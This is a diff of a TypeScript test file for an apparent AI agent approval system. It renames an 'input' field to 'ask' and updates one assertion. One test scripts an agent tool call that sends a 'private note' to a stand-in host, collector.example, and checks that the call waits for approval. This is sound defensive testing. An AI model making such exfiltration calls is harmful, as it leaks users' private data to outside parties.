@@ -59,7 +59,7 @@ const send = async (account: AgentAccount, text: string, threadId?: string) =>
   await asLaptop(account, async (client) => await client.agent.send({ text, threadId }));
 
 const askedRowSchema = z.object({ event_id: z.string(), json: z.string() });
-const askedEventSchema = z.object({ input: z.json() });
+const askedEventSchema = z.object({ ask: z.json() });
 
 // the approval a thread is waiting on, once it asks: the event an answer names, and what it asks
 const askedApproval = async (account: AgentAccount, threadId: string) =>
@@ -71,7 +71,7 @@ const askedApproval = async (account: AgentAccount, threadId: string) =>
         threadId,
       );
       const { event_id: eventId, json } = askedRowSchema.parse(row);
-      return { eventId, input: askedEventSchema.parse(JSON.parse(json)).input };
+      return { ask: askedEventSchema.parse(JSON.parse(json)).ask, eventId };
     },
     { interval: 50, timeout: 10_000 },
   );
@@ -350,7 +350,7 @@ describe("a turn's seal", () => {
       const url = "https://collector.example/?d=the-persons-private-note";
       const sent = await send(account, script(`call save_link ${JSON.stringify({ url })}`));
       const asked = await askedApproval(account, sent.threadId);
-      expect(asked.input).toStrictEqual({ url });
+      expect(asked.ask).toStrictEqual({ kind: "save", url });
       await expect(
         cellRows(account, "SELECT id FROM jobs WHERE kind = 'fill'"),
       ).resolves.toStrictEqual([]);
